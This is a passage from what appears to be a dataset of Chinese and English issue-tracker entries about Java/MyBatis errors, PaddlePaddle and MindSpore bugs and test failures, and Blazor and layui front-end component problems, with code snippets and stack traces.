通用查询全部列表 * @return */ public List&lt;T&gt; selectAll(){ return mapper.selectAll(); } /** * 根据id排序查询 * @param example * @return */ public List&lt;T&gt; selectWithOrder(Example example){ example.setOrderByClause(""id desc""); return mapper.selectByExample(example); } /** * 通用单表分页查询 * @param pageNum * @param pageSize * @return */ public List&lt;T&gt; selectPage(int pageNum,int pageSize){ PageHelper.startPage(pageNum,pageSize); //Spring4支持泛型注入 return mapper.select(null); } } @Service public class UserService extends BaseService&lt;User&gt;{ @Autowired private UserMapper userMapper; /** * 根据主键获取 * @param id * @return */ public User getUser(Long id){ Example example = new Example(User.class); Example.Criteria criteria = example.createCriteria(); criteria.andEqualTo(""id"",id); return userMapper.selectByExample(example).get(0); } } @Controller @RequestMapping(""/user"") public class UserController extends BaseController&lt;User&gt;{ @Autowired private UserService userService; @RequestMapping(""/{id}"") public String userinfo( @PathVariable(""id"") Long id, Model model ){ User user = userService.getById(id); model.addAttribute(""user"",user); return ""/user/userinfo""; } } ava.lang.RuntimeException: 无法获取实体类com.dacaijian.app.entity.User对应的表名! at tk.mybatis.mapper.mapperhelper.EntityHelper.getEntityTable(EntityHelper.java:65) ~[mapper-3.3.9.jar:na] at tk.mybatis.mapper.entity.Example.&lt;init&gt;(Example.java:93) ~[mapper-3.3.9.jar:na] at tk.mybatis.mapper.entity.Example.&lt;init&gt;(Example.java:78) ~[mapper-3.3.9.jar:na] at tk.mybatis.mapper.entity.Example.&lt;init&gt;(Example.java:68) ~[mapper-3.3.9.jar:na] ...... java.lang.ClassCastException: com.dacaijian.app.entity.User cannot be cast to com.dacaijian.app.entity.User at com.dacaijian.app.controller.UserController.userinfo(UserController.java:28) ~[classes/:na] at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_111] at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_111] at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_111] at java.lang.reflect.Method.invoke(Method.java:498) ~[na:1.8.0_111] at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:221) ~[spring-web-4.3.3.RELEASE.jar:4.3.3.RELEASE] at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:136) ~[spring-web-4.3.3.RELEASE.jar:4.3.3.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:114) ~[spring-webmvc-4.3.3.RELEASE.jar:4.3.3.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:827) ~[spring-webmvc-4.3.3.RELEASE.jar:4.3.3.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:738) ~[spring-webmvc-4.3.3.RELEASE.jar:4.3.3.RELEASE] at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:85) ~[spring-webmvc-4.3.3.RELEASE.jar:4.3.3.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:963) ~[spring-webmvc-4.3.3.RELEASE.jar:4.3.3.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:897) ~[spring-webmvc-4.3.3.RELEASE.jar:4.3.3.RELEASE] at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:970) ~[spring-webmvc-4.3.3.RELEASE.jar:4.3.3.RELEASE] at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:861) ~[spring-webmvc-4.3.3.RELEASE.jar:4.3.3.RELEASE] at javax.servlet.http.HttpServlet.service(HttpServlet.java:622) ~[tomcat-embed-core-8.5.5.jar:8.5.5] at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:846) ~[spring-webmvc-4.3.3.RELEASE.jar:4.3.3.RELEASE] at javax.servlet.http.HttpServlet.service(HttpServlet.java:729) ~[tomcat-embed-core-8.5.5.jar:8.5.5] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:230) ~[tomcat-embed-core-8.5.5.jar:8.5.5] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:165) ~[tomcat-embed-core-8.5.5.jar:8.5.5] at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) ~[tomcat-embed-websocket-8.5.5.jar:8.5.5] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:192) ~[tomcat-embed-core-8.5.5.jar:8.5.5] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:165) ~[tomcat-embed-core-8.5.5.jar:8.5.5] at com.alibaba.druid.support.http.WebStatFilter.doFilter(WebStatFilter.java:123) ~[druid-1.0.26.jar:1.0.26] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:192) ~[tomcat-embed-core-8.5.5.jar:8.5.5] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:165) ~[tomcat-embed-core-8.5.5.jar:8.5.5] at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:99) ~[spring-web-4.3.3.RELEASE.jar:4.3.3.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) ~[spring-web-4.3.3.RELEASE.jar:4.3.3.RELEASE] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:192) ~[tomcat-embed-core-8.5.5.jar:8.5.5] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:165) ~[tomcat-embed-core-8.5.5.jar:8.5.5] at org.springframework.web.filter.HttpPutFormContentFilter.doFilterInternal(HttpPutFormContentFilter.java:89) ~[spring-web-4.3.3.RELEASE.jar:4.3.3.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) ~[spring-web-4.3.3.RELEASE.jar:4.3.3.RELEASE] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:192) ~[tomcat-embed-core-8.5.5.jar:8.5.5] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:165) ~[tomcat-embed-core-8.5.5.jar:8.5.5] at org.springframework.web.filter.HiddenHttpMethodFilter.doFilterInternal(HiddenHttpMethodFilter.java:77) ~[spring-web-4.3.3.RELEASE.jar:4.3.3.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) ~[spring-web-4.3.3.RELEASE.jar:4.3.3.RELEASE] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:192) ~[tomcat-embed-core-8.5.5.jar:8.5.5] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:165) ~[tomcat-embed-core-8.5.5.jar:8.5.5] at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:197) ~[spring-web-4.3.3.RELEASE.jar:4.3.3.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) ~[spring-web-4.3.3.RELEASE.jar:4.3.3.RELEASE] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:192) ~[tomcat-embed-core-8.5.5.jar:8.5.5] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:165) ~[tomcat-embed-core-8.5.5.jar:8.5.5] at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:198) ~[tomcat-embed-core-8.5.5.jar:8.5.5] at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:108) [tomcat-embed-core-8.5.5.jar:8.5.5] at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:472) [tomcat-embed-core-8.5.5.jar:8.5.5] at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:140) [tomcat-embed-core-8.5.5.jar:8.5.5] at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:79) [tomcat-embed-core-8.5.5.jar:8.5.5] at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:87) [tomcat-embed-core-8.5.5.jar:8.5.5] at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:349) [tomcat-embed-core-8.5.5.jar:8.5.5] at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:784) [tomcat-embed-core-8.5.5.jar:8.5.5] at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66) [tomcat-embed-core-8.5.5.jar:8.5.5] at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:802) [tomcat-embed-core-8.5.5.jar:8.5.5] at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1410) [tomcat-embed-core-8.5.5.jar:8.5.5] at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-8.5.5.jar:8.5.5] at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) [na:1.8.0_111] at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) [na:1.8.0_111] at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-8.5.5.jar:8.5.5] at java.lang.Thread.run(Thread.java:745) [na:1.8.0_111]"
Verify MKLDNN benchmark using 0.11.0 image,"IntelOptimizedPaddle.md use and , we should verify it using and .   <code>: paddle:latest paddle:latest-openblas paddle:0.11.0 paddle:0.11.0-openblas"
不能从paddle.callbacks 导入EarlyStopping。,1）PaddlePaddle版本：2.0.2 2）CPU：i7-cpu 3）系统环境：win10 4)python版本：python3.8.6 执行下面代码： 报错： 但是能够这样使用： 请问一下，这是什么原因？   <code>: from paddle.callbacks import EarlyStopping ModuleNotFoundError: No module named 'paddle.callbacks' import paddle callbacks=paddle.callbacks.EarlyStopping(...)
mindspore激活函数层的输入数量,对于mindspore中的激活函数层，详细的信息描述可在mindspore.nn中查看。在构建模型时，每个激活函数层可以输入多个张量么？还是说一个激活函数层只可以有一个张量输入？目前开看似乎调用一次只能输入一个张量。想知道是否存在有多个张量输入的情况。 希望可以得到尽快的解答，十分感谢。   <code>: mindspore-assistant
在 DataSet 中添加可通过 id 获取实体对象的方法,"在 工具类中提供 方法，可通过 查询相应的实体对象。 现在： 将来： 对于 与 操作也需要提供类似的特性。 现在： 将来：   <code>: DataSet selectById id User user = DataSet.select(User.class, ""id = ?"", id); User user = DataSet.selectById(User.class, id); 更新 删除 boolean result = DataSet.update(User.class, fieldMap, ""id = ?"", id); ... boolean result = DataSet.delete(User.class, ""id = ?"", id); boolean result = DataSet.updateById(User.class, fieldMap); ... boolean result = DataSet.deleteById(User.class, id);"
Collapse 组件在页面调用 StateHasChanged 方法后消失,"1.使用项目模板创建项目 2.向页面中添加如下代码 Web Assembly   <code>: &lt;button class=""btn btn-primary"" @onclick=""IncrementCount""&gt;Click me&lt;/button&gt; &lt;Collapse&gt; &lt;CollapseItems&gt; &lt;CollapseItem Text=""一致性 Consistency""&gt; &lt;div&gt;与现实生活一致：与现实生活的流程、逻辑保持一致，遵循用户习惯的语言和概念；&lt;/div&gt; &lt;div&gt;在界面中一致：所有的元素和结构需保持一致，比如：设计样式、图标和文本、元素的位置等。&lt;/div&gt; &lt;/CollapseItem&gt; &lt;/CollapseItems&gt; &lt;/Collapse&gt; @code { private void IncrementCount() { StateHasChanged(); } }"
refine mkl,"Partly resolve #6613:Add thread pool supporting a M:N threading model. rename the script from to add independently with mkl script: is very very slow in latest/[version_tag]-openblas docker images, and will be refined to accelerate later. Thus, an independent script is much simpler to be refined. It's easy for us/QA to directly run in openblas images, and in mkl images. auto computes the FPS by avg elapsed time.   <code>: run_mkldnn_*.sh run_mkl_*.sh run_openblas_*.sh run_openblas_*.sh run_openblas_*.sh run_mkl_*.sh"
Markdown 组件表现不一致,"1.文本资源不对: 源码 Web Assembly   <code>: &lt;Markdown language=""zh-cn"" /&gt; &lt;Markdown language=""en"" /&gt; &lt;Markdown language=""zh-cn"" /&gt; &lt;Markdown language=""en"" /&gt; &lt;Markdown language=""zh-cn"" /&gt; &lt;Markdown language=""en"" /&gt;"
table表头添加templet，变量不能正常获取,"版本：2.8 描述：我项目再单元格增加select表单，根据数据设置默认已选值，但是定义的边面没有正常显示，下面的代码中的{{- selectstr }}，没有正常获取到定义的数据，请帮忙看看是不是写错了，谢谢   <code>: &lt;template id=""danwei-select-primary""&gt; {{# var citys = &lt;?php echo select_option('276','','data_json');?&gt;; }} &lt;select name=""order_test_danwei"" class=""layui-border select-demo-primary"" style=""height: 22px; width:100%"" lay-ignore&gt; &lt;option value=""""&gt;单位&lt;/option&gt; {{# layui.each(citys, function(i, v){ var selectstr;if(d.order_test_danwei==v.value){selectstr=""selected='selected'"";} }} &lt;option value=""{{= v.value }}"" {{- selectstr }} &gt;{{= v.name }}&lt;/option&gt; {{# }); }} &lt;/select&gt; &lt;/template&gt;"
[CT][MS][ResizeNearestNeighborV2] The testcase of ResizeNearestNeighborV2 has error.,"The testcase of ResizeNearestNeighborV2 has error The testcase of ResizeNearestNeighborV2 has error. 两个问题待确认： TensorFlow有此限制：“If half_pixel_centers is True, align_corners must be False ” mindspore是否需要对齐？ mindspore 输入“size” 测出来支持int64。 请确认是按照文档只支持int32。还是int8、int16等都支持，文档需要修改。 还有其它问题，详见用例部分 / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version : 1.7.0 -- Python version : Python 3.7.5 -- OS platform and distribution : Linux Ubuntu 16.04 -- GCC/Compiler version : (/): /mode pynative /mode graph 见下 用例 + 报错日志： CPU： <ol start=""3""> Ascend：（ops文件修改过，用交付件ops文件的话用例需要调整） <ol start=""3""> <ol start=""4""> <ol start=""5"">   <code>: def test_resizenearestneighborv2_input_dtype_int8_4d(): attributes = {'align_corners': True, 'half_pixel_centers': True, 'data_format': 'NHWC'} x_type = np.float64 ms_type = mstype.float64 size = [128, 48] size_np = np.array(size, dtype=np.int32) x_shape = [2, 512, 256, 2] grads_shape = [2, 128, 48, 2] x_np = gen_data(x_shape, x_type, 'uniform', np.iinfo( np.int32).min, np.iinfo(np.int32).max) grads_np = gen_data(grads_shape, x_type, 'randint', np.iinfo(np.int32).min, np.iinfo(np.int32).max) fact = ResizeNearestNeighborV2Mock( attributes=attributes, inputs=[Tensor(x_np, dtype=ms_type), Tensor(size_np)], grads=Tensor(grads_np, dtype=ms_type)) &gt; fact.forward_cmp() test_resize_nearest_neighbor_v2.py:627: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/resize_nearest_neighbor_v2.py:68: in forward_cmp out_exp = self.forward_tensorflow_impl() ../share/ops/primitive/resize_nearest_neighbor_v2.py:63: in forward_tensorflow_impl y_exp = sess.run(tf_ops) /root/miniconda3/envs/zhujunan2/lib/python3.7/site-packages/tensorflow/python/client/session.py:968: in run run_metadata_ptr) /root/miniconda3/envs/zhujunan2/lib/python3.7/site-packages/tensorflow/python/client/session.py:1191: in _run feed_dict_tensor, options, run_metadata) /root/miniconda3/envs/zhujunan2/lib/python3.7/site-packages/tensorflow/python/client/session.py:1369: in _do_run run_metadata) home/zhujunan/Crowd_Contributing_Test/ResizeNearestNeighborV2/ResizeNearestNeighborV2/ResizeNearestNeighborV2_Grad_Tester/ResizeNearestNeighborV2_Test/share/ops/primitive/resize_nearest_neighbor_v2.py:60) ]] def test_resizenearestneighborv2_input_dtype_int64_4d(): attributes = {'align_corners': False, 'half_pixel_centers': False, 'data_format': 'NCHW'} x_type = np.int64 ms_type = mstype.int64 size = [128, 48] size_np = np.array(size, dtype=np.int32) x_shape = [4, 7, 4, 4] grads_shape = [4, 128, 48, 4] x_np = gen_data(x_shape, x_type, 'uniform', np.iinfo( np.int32).min, np.iinfo(np.int32).max) grads_np = gen_data(grads_shape, x_type, 'randint', np.iinfo(np.int32).min, np.iinfo(np.int32).max) fact = ResizeNearestNeighborV2Mock( attributes=attributes, inputs=[Tensor(x_np, dtype=ms_type), Tensor(size_np)], grads=Tensor(grads_np, dtype=ms_type)) &gt; fact.forward_cmp() test_resize_nearest_neighbor_v2.py:647: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/resize_nearest_neighbor_v2.py:71: in forward_cmp allclose_nparray(out_exp, out_pre, self.loss, self.loss) ../share/utils.py:29: in allclose_nparray elif not np.allclose(data_expected, data_me, rtol, atol, equal_nan=equal_nan): &lt;__array_function__ internals&gt;:6: in allclose ??? /root/miniconda3/envs/zhujunan2/lib/python3.7/site-packages/numpy/core/numeric.py:2189: in allclose res = all(isclose(a, b, rtol=rtol, atol=atol, equal_nan=equal_nan)) &lt;__array_function__ internals&gt;:6: in isclose ??? /root/miniconda3/envs/zhujunan2/lib/python3.7/site-packages/numpy/core/numeric.py:2290: in isclose return within_tol(x, y, atol, rtol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ x = array([[[[ 739271304, 1957800356, 21216299, -144964858], [ 739271304, 1957800356, 21216299, -1449...[ 661178540, 1423028365, -1601323500, -1448226981], [ 661178540, 1423028365, -1601323500, -1448226981]]]]) y = array([[[[ 7.39271304e+08, 5.94184771e+08, 9.60608257e+08, ..., 2.82741728e+08, 9.68135550e+08, 6.59315...9.81948930e+08, 7.13831405e+08, -6.77958784e+08, ..., 1.11950660e+09, 1.36570787e+09, -1.44822698e+09]]]]) atol = 0, rtol = 0 def within_tol(x, y, atol, rtol): with errstate(invalid='ignore'): &gt; return less_equal(abs(x-y), atol + rtol * abs(y)) E ValueError: operands could not be broadcast together with shapes (4,128,48,4) (4,128,48,7) /root/miniconda3/envs/zhujunan2/lib/python3.7/site-packages/numpy/core/numeric.py:2276: ValueError ____________________________________________________________________ test_resizenearestneighborv2_input_dtype_uint8_4d _____________________________________________________________________ def test_resizenearestneighborv2_input_dtype_uint8_4d(): attributes = {'align_corners': True, 'half_pixel_centers': False, 'data_format': 'NCHW'} x_type = np.uint8 ms_type = mstype.uint8 size = [128, 48] size_np = np.array(size, dtype=np.int32) x_shape = [2, 512, 256, 2] grads_shape = [2, 128, 48, 2] x_np = gen_data(x_shape, x_type, 'uniform', np.iinfo( np.int32).min, np.iinfo(np.int32).max) grads_np = gen_data(grads_shape, x_type, 'randint', np.iinfo(np.int32).min, np.iinfo(np.int32).max) fact = ResizeNearestNeighborV2Mock( attributes=attributes, inputs=[Tensor(x_np, dtype=ms_type), Tensor(size_np)], grads=Tensor(grads_np, dtype=ms_type)) &gt; fact.forward_cmp() test_resize_nearest_neighbor_v2.py:667: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/resize_nearest_neighbor_v2.py:71: in forward_cmp allclose_nparray(out_exp, out_pre, self.loss, self.loss) ../share/utils.py:29: in allclose_nparray elif not np.allclose(data_expected, data_me, rtol, atol, equal_nan=equal_nan): &lt;__array_function__ internals&gt;:6: in allclose ??? /root/miniconda3/envs/zhujunan2/lib/python3.7/site-packages/numpy/core/numeric.py:2189: in allclose res = all(isclose(a, b, rtol=rtol, atol=atol, equal_nan=equal_nan)) &lt;__array_function__ internals&gt;:6: in isclose ??? /root/miniconda3/envs/zhujunan2/lib/python3.7/site-packages/numpy/core/numeric.py:2290: in isclose return within_tol(x, y, atol, rtol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ x = array([[[[220, 174], [220, 66], [188, 201], ..., [196, 228], [123, 150],...144], [220, 165], ..., [124, 92], [243, 84], [145, 4]]]], dtype=uint8) y = array([[[[220., 217., 99., ..., 145., 209., 147.], [220., 217., 99., ..., 145., 209., 147.], [220....146., 4.], [142., 207., 139., ..., 204., 146., 4.], [142., 207., 139., ..., 204., 146., 4.]]]]) atol = 0, rtol = 0 def within_tol(x, y, atol, rtol): with errstate(invalid='ignore'): &gt; return less_equal(abs(x-y), atol + rtol * abs(y)) E ValueError: operands could not be broadcast together with shapes (2,128,48,2) (2,128,48,512) def test_resizenearestneighborv2_input_dtype_float64_4d(): attributes = {'align_corners': True, 'half_pixel_centers': False, 'data_format': 'NCHW'} x_type = np.float16 ms_type = mstype.float16 size = [98, 48] size_np = np.array(size, dtype=np.int32) x_shape = [2, 9, 8, 1] grads_shape = [2, 98, 48, 1] x_np = gen_data(x_shape, x_type, 'uniform', np.iinfo( np.int32).min, np.iinfo(np.int32).max) grads_np = gen_data(grads_shape, x_type, 'randint', np.iinfo(np.int32).min, np.iinfo(np.int32).max) fact = ResizeNearestNeighborV2Mock( attributes=attributes, inputs=[Tensor(x_np, dtype=ms_type), Tensor(size_np)], grads=Tensor(grads_np, dtype=ms_type)) &gt; fact.forward_cmp() test_resize_nearest_neighbor_v2.py:707: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/resize_nearest_neighbor_v2.py:71: in forward_cmp allclose_nparray(out_exp, out_pre, self.loss, self.loss) ../share/utils.py:30: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = array([[[[-inf], [-inf], [-inf], ..., [-inf], [-inf], [-inf]], ...], [ inf], [ inf], ..., [ inf], [ inf], [ inf]]]], dtype=float16) data_me = array([[[[-inf, -inf, inf, ..., -inf, inf, inf], [-inf, -inf, inf, ..., -inf, inf, inf], [-inf... [-inf, -inf, -inf, ..., -inf, -inf, inf], [-inf, -inf, -inf, ..., -inf, -inf, inf]]]], dtype=float16) rtol = 0.001, atol = 0.001 def _count_unequal_element(data_expected, data_me, rtol, atol): &gt; assert data_expected.shape == data_me.shape E AssertionError def test_resizenearestneighborv2_input_dtype_int8_4d(): input_list = [] x0 = Tensor(np.random.randint(-100, 100, size=(6, 11, 4, 11)).astype(np.int8)) input_list.append(x0) x1 = Tensor(np.random.randint(1, 100, size=2).astype(np.int32)) input_list.append(x1) attributes = {'align_corners': True, 'half_pixel_centers': True, 'data_format': 'NHWC'} fact = ResizeNearestNeighborV2Mock(attributes=attributes, inputs=input_list) &gt; fact.forward_cmp() test_resizenearestneighborv2.py:42: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/resizenearestneighborv2_ops.py:67: in forward_cmp out_pre = self.forward_mindspore_impl() ../share/ops/primitive/resizenearestneighborv2_ops.py:54: in forward_mindspore_impl return out.asnumpy() _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = Tensor(shape=[6, 50, 1, 11], dtype=Int8, value= [[[[0, 0, 0 ... 0, 0, 0]], [[0, 0, 0 ... 0, 0, 0]], [[0, 0, 0 ... ...]], [[0, 0, 0 ... 0, 0, 0]], ... [[0, 0, 0 ... 0, 0, 0]], [[0, 0, 0 ... 0, 0, 0]], [[0, 0, 0 ... 0, 0, 0]]]]) def asnumpy(self): """""" Convert tensor to numpy array. Returns self tensor as a NumPy ndarray. This tensor and the returned ndarray share the same underlying storage. Changes to self tensor will be reflected in the ndarray. Returns: A numpy ndarray which shares the same underlying storage with the tensor. Examples: &gt;&gt;&gt; from mindspore import Tensor &gt;&gt;&gt; import numpy as np &gt;&gt;&gt; x = Tensor(np.array([1, 2], dtype=np.float32)) &gt;&gt;&gt; y = x.asnumpy() &gt;&gt;&gt; y[0] = 11 &gt;&gt;&gt; print(x) [11. 2.] &gt;&gt;&gt; print(y) [11. 2.] """""" self._init_check() &gt; return Tensor_.asnumpy(self) E RuntimeError: mindspore/ccsrc/plugin/device/ascend/hal/device/ascend_device_address.cc:202 SyncStream] Sync stream error! def test_resizenearestneighborv2_input_dtype_int16_4d(): input_list = [] x0 = Tensor(np.random.randint(-100, 100, size=(1, 1, 7, 8)).astype(np.int16)) input_list.append(x0) x1 = Tensor(np.random.randint(1, 100, size=2).astype(np.int64)) input_list.append(x1) attributes = {'align_corners': False, 'half_pixel_centers': True, 'data_format': 'NHWC'} fact = ResizeNearestNeighborV2Mock(attributes=attributes, inputs=input_list) &gt; fact.forward_cmp() test_resizenearestneighborv2.py:72: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/resizenearestneighborv2_ops.py:71: in forward_cmp allclose_nparray(out_exp, out_pre, self.loss, self.loss) ../share/utils.py:30: in allclose_nparray elif not np.allclose(data_expected, data_me, rtol, atol, equal_nan=equal_nan): &lt;__array_function__ internals&gt;:6: in allclose ??? /root/archiconda3/envs/zhujunan2/lib/python3.7/site-packages/numpy/core/numeric.py:2249: in allclose res = all(isclose(a, b, rtol=rtol, atol=atol, equal_nan=equal_nan)) &lt;__array_function__ internals&gt;:6: in isclose ??? /root/archiconda3/envs/zhujunan2/lib/python3.7/site-packages/numpy/core/numeric.py:2358: in isclose return within_tol(x, y, atol, rtol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ x = array([[[[ -1, -54, 45, ..., 49, 21, 54], [ -1, -54, 45, ..., 49, 21, 54], [ -1, -54, 45, .... -57, -11], [-22, 49, 37, ..., 15, -57, -11], [-22, 49, 37, ..., 15, -57, -11]]]], dtype=int16) y = array([], shape=(1, 11, 0, 8), dtype=float64), atol = 0, rtol = 0 def within_tol(x, y, atol, rtol): with errstate(invalid='ignore'): &gt; return less_equal(abs(x-y), atol + rtol * abs(y)) E ValueError: operands could not be broadcast together with shapes (1,11,56,8) (1,11,0,8) def test_resizenearestneighborv2_input_dtype_float16_4d(): input_list = [] x0 = Tensor(np.random.randn(6, 11, 7, 11).astype(np.float16)) input_list.append(x0) x1 = Tensor(np.random.randint(1, 100, size=2).astype(np.int32)) input_list.append(x1) attributes = {'align_corners': True, 'half_pixel_centers': False, 'data_format': 'NCHW'} fact = ResizeNearestNeighborV2Mock(attributes=attributes, inputs=input_list) &gt; fact.forward_cmp() test_resizenearestneighborv2.py:222: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 